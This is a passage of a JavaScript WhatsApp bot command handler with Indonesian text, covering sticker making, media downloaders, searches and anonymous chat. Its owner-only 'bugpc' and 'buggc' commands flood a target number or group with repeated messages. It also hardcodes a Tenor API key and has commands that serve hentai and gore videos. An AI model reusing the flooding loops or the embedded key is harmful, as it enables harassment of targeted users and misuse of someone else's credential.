@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await miku.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) miku.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await miku.groupMetadata(i)
                     teks += `› *Nama :* ${metadata.subject}\n› *Owner :* @${metadata.owner.split('@')[0]}\n› *ID :* ${metadata.id}\n› *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n› *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 miku.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), miku.user.id]
                    miku.sendText(m.chat, 'List Online:\n\n' + online.map(v => '› @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': case 'stiker': case 'setiker': {
		if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
                if (/image/.test(mime)) {
		    let media = await quoted.download()
		    let encmedia = await miku.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
		    await fs.unlinkSync(encmedia)
		} else if (/video/.test(mime)) {
		    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
		    let media = await quoted.download()
		    let encmedia = await miku.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
		    await fs.unlinkSync(encmedia)
                } else if (quoted.mentionedJid) {
                    let media = await miku.profilePictureUrl(quoted.mentionedJid[0], 'image')
                    let encmedia = await miku.sendMediaAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
            	    await fs.unlinkSync(encmedia)
		} else if (isUrl(args[0])) {
                    if (isUrl(args[0])) encmedia = await miku.sendMediaAsSticker(m.chat, isUrl(text)[0], m, { packname: global.packname, author: global.author })
		    else return m.reply('URL tidak valid!')
		    await fs.unlinkSync(encmedia)
		} else if (text) {
		    let anu = await xfarr.search.stickersearch(text)
                    for (let i = 0; i < (anu.sticker_url.length < 5 ? anu.sticker_url.length : 5); i++) {
                    	let encmedia = await miku.sendMediaAsSticker(m.chat, anu.sticker_url[i], m, { packname: packname, author: author })
                    	await fs.unlinkSync(encmedia)
                    }
                } else if (quoted.hydratedFourRowTemplate) {
            	    let result = quoted.hydratedFourRowTemplate ? quoted.hydratedFourRowTemplate.imageMessage : quoted.hydratedFourRowTemplate.videoMessage
                    let media = await m.getMsgBuffer(result)
                    let encmedia = await miku.sendMediaAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                    await fs.unlinkSync(encmedia)
            	} else if (quoted) {
            	    let result = quoted.imageMessage || quoted.videoMessage || quoted.message.imageMessage || quoted.message.videoMessage
            	    let media = await m.getMsgBuffer(result)
            	    let encmedia = await miku.sendMediaAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
            	    await fs.unlinkSync(encmedia)
		} else {
            	    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
        	}
	    }
	    break
            case 'take': case 'colong': case 'swm': case 'stickerwm': case 'wm': case 'exif': {
if (!quoted) return reply(`Kirim/Reply media dengan caption ${prefix + command} *Nama*`)
let { writeExif } = require('./lib/exif')
let media = {}
media.mimetype = mime
media.data = await quoted.download()
let encmedia = await writeExif(media, { packname: text.split("|")[0] ? text.split("|")[0] : global.packname, author: text.split("|")[1] ? text.split("|")[1] : global.author })
miku.sendMessage(m.chat, { sticker: { url: encmedia } }, { quoted: m })
}
break
            case 'emojimix': {
	        if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await miku.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
case 'apkdl': {
if (!args[0]) throw `Ex: ${prefix + command} https://play.google.com/store/apps/details?id=com.linecorp.LGGRTHN`
	let res = await apkDl(args[0])
	await m.reply('Wait...')
	miku.sendMessage(m.chat, { document: { url: res.download }, mimetype: res.mimetype, fileName: res.fileName }, { quoted: m })
}
break
case 'gitclone': {
let regex = /(?:https?|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
	if (!args[0]) throw 'Ex: https://github.com/Nurutomo/wabot-aq' 
	if (!regex.test(args[0])) throw 'Invalid URL'
	let [, user, repo] = args[0].match(regex) || []
	repo = repo.replace(/.git$/, '')
	let url = `https://api.github.com/repos/${user}/${repo}/zipball`
	let res = await fetch(url, { method: 'head' })
	if (res.status !== 200) throw res.statusText
	let fileName = res.headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
	let mimetype = res.headers.get('content-type')
	await m.reply('Wait...')
	miku.sendMessage(m.chat, { document: { url }, fileName, mimetype }, { quoted: m })
}
break
case 'sfiledl': case 'sfilesearch': {
if (text.match(/(https:\/\/sfile.mobi\/)/gi)) {
		let res = await sfileDl(text)
		if (!res) throw 'Error :/'
		await m.reply(Object.keys(res).map(v => `*• ${v.capitalize()}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
		miku.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
	} else if (text) {
		let [query, page] = text.split`|`
		let res = await sfileSearch(query, page)
		if (!res.length) throw `Query "${text}" not found :/`
		res = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
		m.reply(res)
	} else throw 'Input Query / Sfile Url!'
}
break
			  
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await miku.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    miku.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
            case 'tomp3': case 'tesya': 
            hasilnya = 'Convert Mp4 to Mp3'
                if (!quoted) throw 'Reply Image'
                if (!/video/.test(mime)) throw `balas video dengan caption *${prefix + command}*`
                m.reply(mess.wait)
               media = await miku.downloadAndSaveMediaMessage(quoted)
               ran = getRandom('.mp3')
               exec(`ffmpeg -i ${media} ${ran}`, (err) => {
               fs.unlinkSync(media)
               if (err) return reply(`Err: ${err}`)
               buffer453 = fs.readFileSync(ran)
               miku.sendMessage(m.chat, { document: buffer453 , mimetype: 'audio/mp3', fileName: `${hasilnya}.mp3` }, { quoted: m})
               fs.unlinkSync(ran)
})
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await miku.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await miku.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await miku.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File } = require('./lib/uploader')
                let media = await miku.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
› Title : ${anu.title}
› Ext : Search
› ID : ${anu.videoId}
› Duration : ${anu.timestamp}
› Viewers : ${anu.views}
› Upload At : ${anu.ago}
› Author : ${anu.author.name}
› Channel : ${anu.author.url}
› Description : ${anu.description}
› Url : ${anu.url}`,
                    footer: 'C H I K A - B O T',
                    buttons: buttons,
                    headerType: 4
                }
                miku.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': {
            if (!text) throw `Example: ytmp4 https://youtu.be/BkBL0Rx-Dtw`
           let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Link yang ada masukan mungkin bukan url youtube`
            m.reply(mess.wait)
            anu = await ytMp3(text)
            
          if (Number(anu.size.split("MB")[0]) >= 9000) return m.reply('File Melebihi Batas '+util.format(anu))
            miku.sendImage(m.chat, `${anu.thumb}`, `Title: ${anu.title}\n Channel: ${anu.channel}\n Like: ${anu.likes}\n Dislike: ${anu.dislike}\n Views: ${anu.views}\nQuality: ${anu.quality}\n Size: ${anu.size}\n Upload: ${anu.uploadDate}\nDesc: ${anu.desc}`, m)
            miku.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4', fileName: `${anu.title}.mp3\n\nFile akan di kirim mohon sabar` }, { quoted: m })
            }
            break
            case 'ytmp4': {
            if (!text) throw `Example: ytmp4 https://youtu.be/BkBL0Rx-Dtw`
           let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Link yang ada masukan mungkin bukan url youtube`
            m.reply(mess.wait)
            anu = await ytMp4(text)
                    if (Number(anu.size.split("MB")[0]) >= 9000) return m.reply('File Melebihi Batas '+util.format(anu))
            miku.sendMessage(m.chat, { video: { url: anu.result }, fileName: `${anu.title}.mp4`, mimetype: 'video/mp4', caption: `Title: ${anu.title}\n Channel: ${anu.channel}\n Like: ${anu.likes}\n Dislike: ${anu.dislike}\n Views: ${anu.views}\nQuality: ${anu.quality}\n Size: ${anu.size}\n Upload: ${anu.uploadDate}\nDesc: ${anu.desc}` }, { quoted: m })
            }
            break

        case 'google': {
                if (!text) throw `Example : ${prefix + command} cara coli`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `› *Title* : ${g.title}\n`
                teks += `› *Description* : ${g.snippet}\n`
                teks += `› *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: 'C H I K A - MD',
                    buttons: buttons,
                    headerType: 4
                }
                miku.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
        

	    case 'telesticker': {
		if (!text) throw `Example : ${prefix + command} https://t.me/addstickers/c1129234339_by_HarukaAyaBot`
		let anu = await xfarr.downloader.telesticker(isUrl(text)[0])
                for (let i = 0; i < (anu.length < 10 ? anu.length : 10); i++) {
                    let encmedia = await miku.sendImageAsSticker(m.chat, anu[i].url, m, { packname: packname, author: author })
                    await fs.unlinkSync(encmedia)
                }
	    }
	    break
   
            case 'zippyshare': case 'zippydl': {
                if (!text) throw `Example : ${prefix + command} https://www69.zippyshare.com/v/MRLWO4qB/file.html#!/N27zvKSgDG46JQ6`
                let anu = await zippyDownloader(isUrl(text)[0])
                if (Number(anu.size.split("MB")[0]) >= 40.00) return m.reply('File Melebihi Batas '+util.format(result))
                miku.sendText(m.chat, util.format(anu), m)
                miku.sendMedia(m.chat, anu.link, '', m)
            }
            break
case 'mediafire': {
if (!args[0]) return m.reply(`Example : \n${prefix + command} <url>`)
if (!isUrl(args[0])) return m.reply("Hanya Url!")
try {
let fmedi = await mediafire(args[0])
teks = `     「 Mediafire Downloader 」

│❏ ▸ Name : ${fmedi[0].name}
│❏ ▸ MimeType : application/${fmedi[0].mime}
│❏ ▸ Size :  ${fmedi[0].size}

${fmedi[0].link}`
let buttons = [
{buttonId: `menu`, buttonText: {displayText: 'Menu'}, type: 1}
]
let buttonMessage = {
image: fs.readFileSync("lib/assets/Miku.jpg"),
caption: teks,
footer: "© C H I K A - MD",
buttons: buttons,
headerType: 4,
}
miku.sendMessage(m.chat, buttonMessage, { quoted: m })
miku.sendMessage(m.chat, {document:{url:fmedi[0].link}, mimetype:fmedi[0].mime, fileName:fmedi[0].name}, {quoted:m})
} catch(err) {
m.reply(String(err))
}
}
break

	    case 'stickersearch': case 'ssearch': {
                if (!text) throw `Example : ${prefix + command} loli`
                let anu = await xfarr.search.stickersearch(text)
                for (let i = 0; i < (anu.sticker_url.length < 5 ? anu.sticker_url.length : 5); i++) {
                    let encmedia = await miku.sendMediaAsSticker(m.chat, anu.sticker_url[i], m, { packname: packname, author: author })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
case 'yts': case 'ytsearch': {
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} dj 30 detik`)
let yts = require("yt-search")
let search = await yts(args.join(" "))
listSerch = []
teskd = `\nResult From ${args.join(" ")}, klik tombol dibawah untuk melihat list youtube search, dan pilih salah satu untuk mendownload video tersebut\n`
for (let i of search.all) {
listSerch.push({
title: i.title, rowId: `ytdl ${i.url}`, description: `Author : ${i.author.name} / ${i.timestamp}`})
}
const sections = [
{
title: "Total Search " + search.all.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: "© C H I K A - B O T",
title: "     「 Youtube Search Downloader 」",
buttonText: "List Search",
mentions: parseMention(teskd),
sections
}
miku.sendMessage(from, listMessage, {quoted:m})
}
break
   case 'couplepp':  case 'ppcouple': {
                reply('wait..')
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                miku.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male🙎🏻‍♂️` }, { quoted: m })
                miku.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female🙎🏻‍♀️` }, { quoted: m })
            }
	    break
	    
	    case 'getexif': {
	        let webp = require('node-webpmux')
		if (!quoted) return reply('Reply Stickernya')
		let que = { message: { [m.quoted.mtype]: m.quoted } }
		if (/webp/.test(mime)) {
		   anu = await new webp.Image()
		   await anu.load(await quoted.download())
		   m.reply(util.format(JSON.parse(anu.exif.slice(22).toString())))
		}
	    }
	    break
           case 'ttmp3':
            iya = await xfarr.Tiktok(text)
            if (!text) throw `Example : ${prefix + command} https://vt.tiktok.com/ZSeAsTBQ9/`
            m.reply(mess.wait)
            miku.sendMessage(m.chat, { document: { url: iya.medias[2].url }, mimetype: 'audio/mp3', fileName: `${iya.title}.mp3` }, { quoted: m})
             break
	         
            
            case 'ttnowm':
            iya = await xfarr.Tiktok(text)
            if (!text) throw `Example : ${prefix + command} https://vt.tiktok.com/ZSeAsTBQ9/`
            m.reply(mess.wait)
            miku.sendMessage(m.chat, { video: { url: iya.medias[1].url }, caption: `C H I K A - MD` }, { quoted: m})
             break
case 'igdl': case 'instagram': {
if (!args[0]) return m.reply(`Example :\n${prefix + command} https://www.instagram.com/p/CcvJGuxh9VI/?igshid=YmMyMTA2M2Y=`)
try {
hxz.igdl(args[0]).then(async(resed) => {
ini_anu = []
anu_list = []
textbv = `*- INSTAGRAM DOWNLOADER -*\n\n⭔ Username : ${resed.user.username}\n⭔ Followers : ${resed.user.followers}`
urut = 1
for (let i = 0; i < resed.medias.length; i++) {
ini_anu.push({
 "type": resed.medias[i].fileType,
 "url": resed.medias[i].url
})
}
ilod = 1
for (let i of ini_anu) {
anu_list.push({buttonId: `igz ${i.type} ${i.url}`, buttonText: {displayText: `Media ${ilod++}`}, type: 1})
}
textbv += `\n\n_Pilih media dibawah untuk mendownload_`
let buttons = anu_list
let buttonMessage = {
image:thumb,
jpegThumbnail: thumb,
caption: textbv,
footer: "© C H I K A - B O T",
buttons: buttons,
headerType: 4
}
miku.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (err) {
m.reply(String(err))
}
}
break
case 'igz': {
if (args[0] === "mp4") {
miku.sendMessage(from, {video:{url:args[1]}, caption:'Done!', mimetype:'video/mp4'}, {quoted:m})
} else if (args[0] === "jpg") {
miku.sendMessage(from, {image:{url:args[1]}, caption:'Done!'}, {quoted:m})
} else {
m.reply(" Error! ")
}
}
break
case 'tiktok':{   
if (args.length < 1) return m.reply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return m.reply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
m.reply(mess.wait)
bcl.tiktokdl(lin).then(res => {
console.log('[ T I K T O K ] downloader'+ res)
console.log(res)
let ep = res.video.no_watermark   
  console.log(ep)
miku.sendMessage(from, {caption: `• *Author*: ${res.author.nickname} 
• *Description*: ${res.description}`, video: {url: ep}},{quoted: m})
 })
 }
 break
case 'tiktok2':{   
if (args.length < 1) return m.reply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return m.reply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
m.reply(mess.wait)
bcl.tiktokdlv3(lin).then(res => {
console.log('[ T I K T O K 2 ] downloader'+ res)
console.log(res)
let ep = res.video.no_watermark
  console.log(ep)
miku.sendMessage(from, {caption: "Tiktok DownloaderV2", video: {url: ep}},{quoted: m})
 })
 }
 break
case 'hentaivideo':
hentaivid().then(res => {
console.log('[ Hentai ]'+ res)
console.log(res)
let ep = res.hasil.video_1
  console.log(ep)
miku.sendMessage(from, {caption: `• *TITLE* : ${res.hasil.title}
• *LINK* : ${res.hasil.link}
• *CATEGORY* : ${res.hasil.category} 
• *SHARE COUNT* : ${res.hasil.share_count}
• *VIEWS COUNT* : ${res.hasil.views_count}`, video: {url: ep}},{quoted: m})
 })
 break
case 'randomgore':
case 'gore':
randomgore().then(res => {
console.log('[ Random Gore ]'+ res)
console.log(res)
let ep = res.data.link
  console.log(ep)
miku.sendMessage(from, {caption: `• *JUDUl* : ${res.data.judul} 
• *VIEWS* : ${res.data.views}
• *COMMENT* : ${res.data.comment} 
• *LINK* : ${res.data.link}`, video: {url: ep}},{quoted: m})
})
break
case 'bugpc': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
miku.sendMessage(num + '@s.whatsapp.net', {text:"Hai Aku Bot Ketik #help"}, {quoted:lep})
await sleep(waktu)
}
tek = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
}
break
case 'buggc': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi haruskan bot masuk grupnya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
miku.sendMessage(num, {text:"Hai Aku Bot Ketik #help"}, {quoted:lep})
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
reply(tekteka)
}
break
case 'tiktokmusik':{       
if (args.length < 1) return m.reply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return m.reply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
m.reply(mess.wait)
bcl.tiktokdlv3(lin).then( async res => {
console.log('[ T I K T O K AUDIO ] downloader')
let ep = res.video.music                  
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return m.reply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
miku.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: m })
fs.unlinkSync(ran)
})
})
}
 break
                       
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (cmdmedia[hash] && cmdmedia[hash].locked) throw 'You have no permission to change this sticker command'
                cmdmedia[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                fs.writeFileSync('./lib/db/cmd.json', JSON.stringify(cmdmedia))
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (cmdmedia[hash] && cmdmedia[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete cmdmedia[hash]
                fs.writeFileSync('./lib/db/cmd.json', JSON.stringify(cmdmedia))
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(cmdmedia).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                miku.sendText(m.chat, teks, m, { mentions: Object.values(cmdmedia).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in cmdmedia)) throw 'Hash not found in database'
                cmdmedia[hash].locked = !/^un/i.test(command)
                fs.writeFileSync('./lib/db/cmd.json', JSON.stringify(cmdmedia))
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = JSON.parse(fs.readFileSync('./lib/db/msg.json'))
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
                fs.writeFileSync('./lib/db/msg.json', JSON.stringify(msgs))
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}
Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = JSON.parse(fs.readFileSync('./lib/db/msg.json'))
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                miku.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./lib/db/msg.json'))
	        let seplit = Object.entries(msgs).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `› *Name :* ${i.nama}\n› *Type :* ${Object.keys(i.message)[0]}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = JSON.parse(fs.readFileSync('./lib/db/msg.json'))
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
                fs.writeFileSync('./lib/db/msg.json', JSON.stringify(msgs))
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'addrespon':
			if (!isCreator) throw mess.owner
				if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks|teks*`)
if (!text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan command} *teks|teks*`)
atas = arg.split('|')[0]
bawah = arg.split('|')[1]
				if (checkCommands(atas, commandsDB) === true) return m.reply(`Udah ada`)
				addCommands(atas, bawah, sender, commandsDB)
				m.reply(`Sukses menambahkan respon ${atas}`)
				break
			case 'delstik':
			if (!isCreator) throw mess.owner
					try {
					 commandsDB.splice(text)
					 fs.unlinkSync('./lib/db/respon.json')
					 m.reply(`Sukses menghapus sticker ${body.slice(11)}`)
					} catch (err){
						console.log(err)
						m.reply('pack itu tidak terdaftar')
					}
					break

case 'delrespon':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
m.reply(teks)
break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                miku.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await miku.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, miku.user.name, m)
            }
			break
case 'pinterest': case 'pin': {
                if (!text) throw `Example : ${prefix + command}`
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]      
                let log = await getBuffer(result)         
                let buttons = [                   
                    {buttonId: `pinterest ${text}`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },         
                    jpegThumbnail: log,         
                    caption: `*Click Next To Continue*`,
                    footer: `© C H I K A - MD`,
                    buttons: buttons,
                    headerType: 4
                }
                miku.sendMessage(m.chat, buttonMessage, { quoted: m }).catch((err) => m.reply('*Sorry An error occurred*'))
            }
           break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await miku.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'sendkontak': case 'sendcontact': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
